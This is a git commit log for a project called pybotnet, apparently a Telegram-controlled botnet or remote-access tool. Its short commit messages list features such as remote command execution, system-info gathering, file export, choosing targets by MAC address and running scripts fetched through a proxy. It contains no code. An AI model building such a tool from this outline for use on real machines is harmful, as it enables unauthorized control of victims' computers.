+    add __init__.py
+
+commit 085dc1046930b54e40d83562abfb1bed84c7c349
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jul 2 18:54:10 2021 +0430
+
+    Change priority
+
+commit 4c3a08e57cab1fb53afc849baf5c8a640a8bb33b
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Jul 2 07:11:51 2021 -0700
+
+    Update TODOLIST.MD
+
+commit 3d90964cfe0b9ca6760b226049248afd0eead236
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Jul 2 07:10:27 2021 -0700
+
+    Update README.md
+
+commit 7f8355ca64662ff79c2b7c51acd69cfd51e714f2
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jul 2 18:35:21 2021 +0430
+
+    add todo: make test for pybotner
+
+commit 09d589c96d634792b6226846fee2f71fee8ebf75
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jul 2 18:33:36 2021 +0430
+
+    edit command table
+
+commit b392d6f2803df851caed80326f110eb024d7f828
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jul 2 18:32:00 2021 +0430
+
+    edit table
+
+commit 840ff4e1d636072bf54cfc67b8dcc2963a228cb8
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jul 2 18:29:29 2021 +0430
+
+    add file exporter  script and download manager method v0.14
+
+commit cfcc7b89bba443d848cdf71b91940537aaefb514
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Wed Jun 30 12:23:30 2021 -0700
+
+    Update README.md
+
+commit 58660e5bdf657e556ffdafab4ac1a1b0f3978361
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Wed Jun 30 12:17:26 2021 -0700
+
+    Update README.md
+
+commit 5056aeb861785710101a1ba570a5ff62fc3e0d0a
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Wed Jun 30 12:14:48 2021 -0700
+
+    update sample
+
+commit 7e4f077f26d9d7ff276f565529bc6f2ce5f9f876
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jun 29 02:13:25 2021 -0700
+
+    Create TODOLIST.MD
+
+commit 78a0ecc64b2895096aefa8bdc2103cc704f57a87
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 29 02:06:49 2021 -0700
+
+    delete wrong import
+
+commit e5d2f5964edb8a4279868846d956a24fe3f36899
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 29 02:06:27 2021 -0700
+
+    update to 0.13
+
+commit d88be79c87da63c2f4985c5614d13a875150c69c
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 29 02:04:45 2021 -0700
+
+    add is_shell method
+
+commit ba0aecd2816926c95f5c5dd150e74f3af66ab056
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 29 01:23:51 2021 -0700
+
+    add sample code and configs
+
+commit 851ceb01e3f0a0e2f6e39466365524d2ca5ccb49
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jun 29 02:11:20 2021 +0430
+
+    Update README.md
+
+commit 8796e80490aef14602d0056a832c99bef0f5ad0d
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jun 29 01:58:22 2021 +0430
+
+    Update README.md
+
+commit 5e6e1d97bc211d300060bb8a7444a9b444068aec
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jun 29 00:48:49 2021 +0430
+
+    Create TODOLIST.MD
+
+commit 5c58174b124f0ffbe851c15bebd9e200f8c347a0
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jun 29 00:46:11 2021 +0430
+
+    add some todo
+
+commit 541960767b0f473ba89e5c524d2bbd140df8a8c6
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jun 29 00:45:32 2021 +0430
+
+    Update TODOLIST.MD
+
+commit a34031fc3ce01ed04e182adda62331f7938fc3a4
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Fri Jun 25 18:14:12 2021 +0430
+
+    Update TODOLIST.MD
+
+commit 80ae829d520de5aad3eb3bb55d0bc7ae9d96cae1
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Jun 24 16:38:20 2021 +0430
+
+    Update README.md
+
+commit 6e4b3566a7f2939700f3b29e6b935d88bf2f9cb0
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Jun 24 16:29:12 2021 +0430
+
+    Update README.md
+
+commit a2e0a945f5222f7a25577a69b3ff6856c37b0919
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Wed Jun 23 16:39:18 2021 +0430
+
+    Update TODOLIST.MD
+
+commit dcab76efe6d07a6d0964f609ef84bb930a290654
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Wed Jun 23 16:38:52 2021 +0430
+
+    Update TODOLIST.MD
+
+commit 7c5e79aaddcc32bf9ce0fa2fe1145592a90ce1ad
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 23 09:46:35 2021 +0430
+
+    update to 0.12
+
+commit 5f65953ae75203d4a5c5eafac42b0c2a8d109652
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 23 09:45:37 2021 +0430
+
+    test cmd on linux
+
+commit 88eb34054a914869c64c3d4ed082c87030074927
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 23 09:45:23 2021 +0430
+
+    replace \\n to \n
+
+commit 830721adec8139c3577a5aeaa47e6c626a16c762
+Author: onionj <onionj98@gmail.com>
+Date:   Wed Jun 23 09:44:56 2021 +0430
+
+    add new TODO
+
+commit 2142f56ae29af853905a1c2cc08000923fc94e2d
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 22:16:13 2021 -0700
+
+    add exception overflowerror
+
+commit 047f2732bec3aa7dac734be67c65ab053cc3e55c
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 21:58:40 2021 -0700
+
+    change message from admin to command from admin
+
+commit 49bb01936e6206890737b904ef9466fa7a5af3e0
+Merge: 58000a8 59131d1
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 21:53:54 2021 -0700
+
+    Merge branch 'master' of https://github.com/onionj/pybotnet
+
+commit 58000a844128c156a8f8405f4c6dea9de7cc1fa9
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 21:53:45 2021 -0700
+
+    move files to pybotnet folder
+
+commit c19b2f9339c8aec148a21f0666a5bc07abf342e6
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 21:30:45 2021 -0700
+
+    replace ـ to _
+
+commit ef426b8af1886d22e9bcf3f1422de5cec947496c
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 21:26:20 2021 -0700
+
+    edit imports
+
+commit 59131d143b7e46708746f170e853b5eaabc2a761
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jun 22 14:33:35 2021 -0700
+
+    Update README.md
+
+commit eafb32e9ca561d076f90bad2cc26abc400b13fdc
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Tue Jun 22 13:54:08 2021 -0700
+
+    Update README.md
+
+commit 70a31a0cd8ca7a67c503e19211603dc25422ad34
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 20:40:37 2021 -0700
+
+    update to .11
+
+commit 0d11d8966a13c6deb169ff8e185f4edc8fa69b94
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 20:31:31 2021 -0700
+
+    edit
+
+commit f79218da7c751831abec6cc16d1f89a864c09c7a
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 20:30:29 2021 -0700
+
+    edit
+
+commit 8c05c8441e8207c6342eabd49430c01122070597
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 20:29:32 2021 -0700
+
+    edit
+
+commit c1a7c8ceb58d29a8b9a892f195ee2061fd61d33b
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 20:29:05 2021 -0700
+
+    message > command
+
+commit 8de92ade391510180363ac4771de4e069fb42f06
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 20:28:23 2021 -0700
+
+    edit text
+
+commit 371964b05973596df7de9e1a883978a105327441
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 20:27:40 2021 -0700
+
+    testing new methods
+
+commit 56786148bbfc81d528264914fb220daf7fd935cb
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 20:26:04 2021 -0700
+
+    Select a target with a MAC address
+
+commit 2d0e5c129cd57323d553387083a9aa4f517e8f15
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 20:22:42 2021 -0700
+
+    add  macaddres in execute_scripts
+
+commit c1982cde612931dd1f3317f588c75fc0175188f3
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 20:03:44 2021 -0700
+
+    add get_ls method
+
+commit e882df718d5f8c666e480916cec41720669c59ae
+Author: onionj <onionj98@gmail.com>
+Date:   Tue Jun 22 19:59:25 2021 -0700
+
+    add method get system info and rin command
+
+commit 2883844201d131572b01b382d4cec26dffb17c5c
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 21 13:35:32 2021 +0430
+
+    edit table
+
+commit 075b0fc2ddee494242a4cb7ddbda784497ae7c8a
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 21 13:34:57 2021 +0430
+
+    edit table
+
+commit 802b7f295e3c8289c1d959826e3ded596092a244
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 21 13:31:08 2021 +0430
+
+    edit table
+
+commit 3155f2550fef13d3058372b8abf6a429bb3094da
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 21 13:30:14 2021 +0430
+
+    add some warn and  edit
+
+commit d872f6961cfd86bab1fd2cd3a41957891fd7e3b5
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 21 13:28:00 2021 +0430
+
+    debug cmd in linux
+
+commit 9597c225d884b63e2f6f4e7bfa0a22369adf6599
+Author: onionj <onionj98@gmail.com>
+Date:   Mon Jun 21 13:00:46 2021 +0430
+
+    test
+
+commit f534c8f633873df2984a5b4fef1849f3e1413fb3
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Mon Jun 21 12:31:51 2021 +0430
+
+    add new table
+
+commit 90ea994ef3315cb67a7377ca8dd663712eb6302c
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 13:40:06 2021 -0700
+
+    move get_info up
+
+commit 04991cd1abb0755ab888c85da5ab7f78a1ab079a
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 13:39:26 2021 -0700
+
+    edit dosleep > do_sleep
+
+commit 6635b1c47347c5e649ee73b1983d13e8dfbf46bd
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 13:37:07 2021 -0700
+
+    update to 0.1
+
+commit 6d88dc0b997dbf889984fc741b90544eb483e019
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 13:36:29 2021 -0700
+
+    add sample in command table
+
+commit 3a4c766c8a5cccf120b44a4620b60ae0a0378b41
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 13:35:49 2021 -0700
+
+    debuge do_sleep
+
+commit bedf6153bcaec37896fa1b13fd3ca181d99d27b8
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 13:14:35 2021 -0700
+
+    edit get_command_name use split_command
+
+commit d6efff6a46ce8a22d27ce14de267dd2c33bedfc4
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 13:09:58 2021 -0700
+
+    update to 0.09
+
+commit b470159d0471f03da791e996cbd1452669dd5701
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 13:09:47 2021 -0700
+
+    edit and add ls command
+
+commit 5ba718031a9c4151056a1a0637d51676f101329c
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 13:09:29 2021 -0700
+
+    add ls command
+
+commit a538acb29aee1669f03c018d82013e9119ac4fda
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 13:08:49 2021 -0700
+
+    remove empty import
+
+commit b8de273c8a799bc01aeb39a5f04d28941fdb8533
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 12:49:15 2021 -0700
+
+    edit some TODO
+
+commit 73981c1f64632b7d7a93461e88fec91f2757bb78
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 12:42:37 2021 -0700
+
+    add new TODO
+
+commit 945701245f10d7bdd5414c75043372b15890f67f
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 12:41:17 2021 -0700
+
+    add newo TODO
+
+commit a4fffba34a891a4282274caf3fb621a900026aab
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 11:03:43 2021 -0700
+
+    edit
+
+commit f1bb08d57db8e5c099357bfde6e24f4a32d759ba
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 11:00:58 2021 -0700
+
+    edit
+
+commit 5ea604f71799df9ef285fc93335bd29a91b97006
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 11:00:05 2021 -0700
+
+    edit
+
+commit ab7b8974dcc21f610a90e8469ab9c8193d1e0db4
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:55:52 2021 -0700
+
+    edit
+
+commit 3cbea773344f9d3798ef99d71150cda586629f55
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:54:18 2021 -0700
+
+    add requirements
+
+commit ce92f2754bbf6c6d6de9a1b75b8d81ae0f7c456b
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:52:31 2021 -0700
+
+    edit
+
+commit 5ca0649ee0ede5c643270e5d40803fd6999b1051
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:51:47 2021 -0700
+
+    0.08
+
+commit 2753174188a847c8b58112d3393c8d5487c6a71b
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:50:39 2021 -0700
+
+    edit version
+
+commit 6adf4262cba56b77a9046b9fd5a853975675024c
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:49:35 2021 -0700
+
+    make do_sleep message Optional
+
+commit b27446c693d443d0590a2e3d94218487d95064d7
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:49:05 2021 -0700
+
+    edit
+
+commit 35c8f8407f4e9b075e15405e07c7c9563444df7a
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:41:53 2021 -0700
+
+    add execute_cmd
+
+commit 3e7040751139b1c1405ed909619ad2f1bb746153
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:39:46 2021 -0700
+
+    update 0.07
+
+commit a356b4b3feba959bafdc05fcbce394c5ea1ce0ec
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:33:48 2021 -0700
+
+    remove timeout in cmd
+
+commit 51ae1cb657c60ccdbdcdc3fbd3a2fa2c0c3d3139
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:29:50 2021 -0700
+
+    add cmd
+
+commit 53927c59f24f2bf3170e5b707baa258c4f5c3ad9
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:27:37 2021 -0700
+
+    update to 0.07
+
+commit 93e5888784460f74a20bf08f271fd37a3a97c6eb
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:27:18 2021 -0700
+
+    add command executer (cmd)
+
+commit 48bef51045d47f09bcc309b1aaf0488983e9e4b0
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:20:30 2021 -0700
+
+    testing
+
+commit 64009fe1f49b5a064676df2a74bff7c436797036
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:20:22 2021 -0700
+
+    add get_info command
+
+commit 7ac8bf62cfb9803abd20104e17b911935e57acf2
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 08:59:46 2021 -0700
+
+    get pybotname uptime
+
+commit b75e8b7ec1b1523d8d5f800404cf6331244fe7ab
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 08:59:20 2021 -0700
+
+    add get_current_epoc_time
+
+commit d7203be676f6718ac469fe354fa8d1487e2dceb8
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 08:51:52 2021 -0700
+
+    edit sample code
+
+commit ce8b1b24458dbd57477636d5f41ae18d96f57216
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 08:50:52 2021 -0700
+
+    update system info
+
+commit 4193f49ed5247043413b358fb79136eb73dc977d
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 08:25:55 2021 -0700
+
+    add some data in systems info
+
+commit 240f09547fa0823e272ec5bb3a062eee49fca2d8
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 07:54:59 2021 -0700
+
+    edit
+
+commit 3c20e575f00f9fd1aad7c4f098dd700212f6dd42
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 10:24:32 2021 -0700
+
+    add get system info
+
+commit bd77fc5c5f7f64f74cb54986d5146ccb536c65e7
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:54:03 2021 -0700
+
+    add __str__ : return settings.pybotnet_info
+
+commit 468b42bd084f37e0a074d634a16312d46e37b5ed
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:53:30 2021 -0700
+
+    add info
+
+commit b17e4b57302110329bb0ecfe7bcfff91f6f1f320
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:44:08 2021 -0700
+
+commit 4db6b186ed4010605c10c57e7f6a4f5e36725fe5
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:42:32 2021 -0700
+
+commit 1ce7f91b2da6e34774e2a81778aa8f687ebfb521
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:40:17 2021 -0700
+
+    if message == none print noting
+
+commit 99fc7d0a4ddb64e3ebddd82532861dda261ff3f3
+Author: onionj <onionj98@gmail.com>
+Date:   Sun Jun 20 09:33:21 2021 -0700
+
+    check if not is_command do noting
+
+commit c66840bef97ef2b6802e8ce8aa1760fa524c934f
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sun Jun 20 13:28:23 2021 +0430
+
+    Update README.md
+
+commit cc0bebc0cf9fe45622e5f7425fe1ba0926700cce
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 08:36:33 2021 -0700
+
+    test
+
+commit 837ed4c1cb56ec2aa88738e8d39e3b13627581f6
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jun 19 08:35:18 2021 -0700
+
+    Update README.md
+
+commit a52dfa63c363f98ca282aec54bc434b397300ac8
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Sat Jun 19 08:33:47 2021 -0700
+
+    Update README.md
+
+commit 0461ddb3798caa42153405b41c0da3e95c6483c0
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 08:16:43 2021 -0700
+
+    update
+
+commit 0285daa3bc2163e753c1a0171104f79a2f747d21
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 08:14:45 2021 -0700
+
+    update version 0.05
+
+commit d963186570d783c9123e0206cad115cc26f471ac
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 08:04:41 2021 -0700
+
+    make sample
+
+commit 59b851392ad296f8cdace213fb16dc24623f3893
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 08:03:40 2021 -0700
+
+    add get_and_execute_scripts_by_third_party_proxy
+
+commit 491669757ed335cc91d300d5cb6d7a39230d4d7b
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 08:02:56 2021 -0700
+
+    return Output
+
+commit 6ee8601a58469bf0d8036f04db5f625a7b8aebad
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 07:46:00 2021 -0700
+
+    make and add first script
+
+commit e7dd2d6fe160b84b2a888b17c7974cdd4dbbaa6c
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 07:00:40 2021 -0700
+
+    send TELEGRAM_TOKEN to extract_last_admin_command
+
+commit fc6ad66725b52aac57f729967c6aafd285daf211
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 06:59:48 2021 -0700
+
+    set_message_ofset and get_last_update_id
+
+commit fe5be41df68031297657e2aab0a26dadb8395635
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 13:01:27 2021 -0700
+
+    add hit in error
+
+commit a423a60e858f0a79a85a01653b8a27a68df55231
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 12:57:03 2021 -0700
+
+    add doc string and comment
+
+commit 24578bee428a4e0e7837dacbff3d6600599a2a6f
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 09:33:54 2021 -0700
+
+    add method for get command from telegram
+
+commit fc148aa224880c79147fff1202301ee3d6f1b043
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 09:33:22 2021 -0700
+
+    add method: get_last_command_by_third_party_proxy
+
+commit c79808b2af1e6ca3ea2e4905c44ea7cfd7063919
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 09:32:46 2021 -0700
+
+    testing
+
+commit 339c361d57e5a1b5783ba36d7cf18230b339bcd0
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 09:32:36 2021 -0700
+
+    add extract_last_admin_command
+
+commit 0b4fdf3ca16511b831c9f6467eb84e53f5e363e9
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 08:51:02 2021 -0700
+
+    add get_update_by_third_party_proxy
+
+commit 629d0a8c4c57881d61205b0694c5126cdbd15a36
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 08:50:38 2021 -0700
+
+    add bs4
+
+commit 60a355dd9a95e92535a1a64ed587ea8bb7c6db8d
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 07:35:38 2021 -0700
+
+    add .vscode
+
+commit 395b4e36dc3be600340c5ad774e40f8b7d46d311
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 07:04:29 2021 -0700
+
+    add version
+
+commit f519e739dcd357ecf83e8375047550c4ffc0a6ce
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 07:04:07 2021 -0700
+
+    Add asyncio feature
+
+commit fe2705c27715627d0a3aa89b0d2111d729708d41
+Author: onionj <onionj98@gmail.com>
+Date:   Sat Jun 19 06:56:41 2021 -0700
+
+    change doc string
+
+commit c33ddf13d5e035f73e1e93ed0204785e7c9c4a69
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:41:07 2021 -0700
+
+    add doc string in methods
+
+commit 38708c9a1e58fb7874d6cc5282e72b1e31708b20
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:37:43 2021 -0700
+
+    add def send_message
+
+commit f5cee52e37356ca69c54340a4a4914504e1abcf0
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:35:07 2021 -0700
+
+    add normal post_data function
+
+commit a63239d945fba62e9e6888e618aad50a49aadb9d
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:28:00 2021 -0700
+
+    add doc string
+
+commit 99e31486b989c9c85117ead9745997d88485e758
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:24:12 2021 -0700
+
+    add comment
+
+commit 57858f0b5b5a2d60b1be682b066b777edfd4e6df
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:13:05 2021 -0700
+
+    Features
+
+commit 9ada302601111645b328a9e9a5875051475faa29
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:12:16 2021 -0700
+
+    add features
+
+commit c9c1871dccec437f56eec9d47370689dbda80200
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:11:17 2021 -0700
+
+    make some TODO
+
+commit 6c4cb2b46caf094cd332faaa4aed13b461ab2430
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:03:07 2021 -0700
+
+    add logger
+
+commit fd4b53ab97be83a74297dfb3363842f8de1993a2
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:01:54 2021 -0700
+
+    make sample send message method
+
+commit a8053deaa225398228f2233268ed239216bc4ae8
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 14:01:36 2021 -0700
+
+    add logging and send message method
+
+commit 77860c7aee54800c84600e2a039556a4bb278872
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 12:27:21 2021 -0700
+
+    add some todo
+
+commit 38cdf392e8e8040f87a0f78e7cad8b0cc07ab38a
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 12:25:41 2021 -0700
+
+    init  PyBotNet class
+
+commit 3a577e3bd12c3e30ac7b6c96c1b315ca43cd2e5f
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 12:24:35 2021 -0700
+
+    send message debog
+
+commit 43103c4adcfc4a2c271f7401a5d23bdb1212d87b
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 10:40:49 2021 -0700
+
+    add exception for contorol timeout error
+
+commit 9e026c752b0eb677ba0dea7ef5d92a84ff4a41d0
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 10:39:44 2021 -0700
+
+    make for crate sample app
+
+commit 0b58f6046bcb4a424d1e9f40e4eae7d9d6f7ad32
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 10:39:05 2021 -0700
+
+    add configs file for save TOKEN, CHAT_ID
+
+commit 5e732b89b4e287ff09679bc63502ee5a8776a1df
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 10:25:31 2021 -0700
+
+    add api link maker
+
+commit 82a347f9b0fe0b45708037351943505614d28eb8
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 10:24:49 2021 -0700
+
+    add requests
+
+commit 1d8cdbb18c1c70948c96312c83bcc8a2d69e1749
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 10:17:22 2021 -0700
+
+    add old file for review
+
+commit 1ab1d8ece1ed2f7398538972b42d9ea9aeb3f8d3
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 10:11:16 2021 -0700
+
+    add docstring for util.py file
+
+commit b3053fddcf3c45cd456278b57257948ddff2828a
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 10:03:27 2021 -0700
+
+    add third party proxy server
+
+commit 9cb8e5b97051a89526ba1e49cc4a889cb778b668
+Author: onionj <onionj98@gmail.com>
+Date:   Fri Jun 18 09:30:51 2021 -0700
+
+    create Files
+
+commit c878d4d5d0c7d3cd45110bcc4d4c0c9cfcfa5844
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Jun 10 04:45:33 2021 -0700
+
+    Update README.md
+
+commit 22b9ac987a11eab9f9a02eca90edeb5b4d72fdb9
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Jun 10 04:31:03 2021 -0700
+
+    Create TODOLIST.MD
+
+commit 86139a7ba557e6dc109ce44d999b3174dad21610
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Jun 10 04:26:23 2021 -0700
+
+    Update README.md
+
+commit c40c5d318f54c68119b5f1202146cfea7d910b3b
+Author: /oNion <77416478+onionj@users.noreply.github.com>
+Date:   Thu Jun 10 04:14:20 2021 -0700
+
+    Initial commit
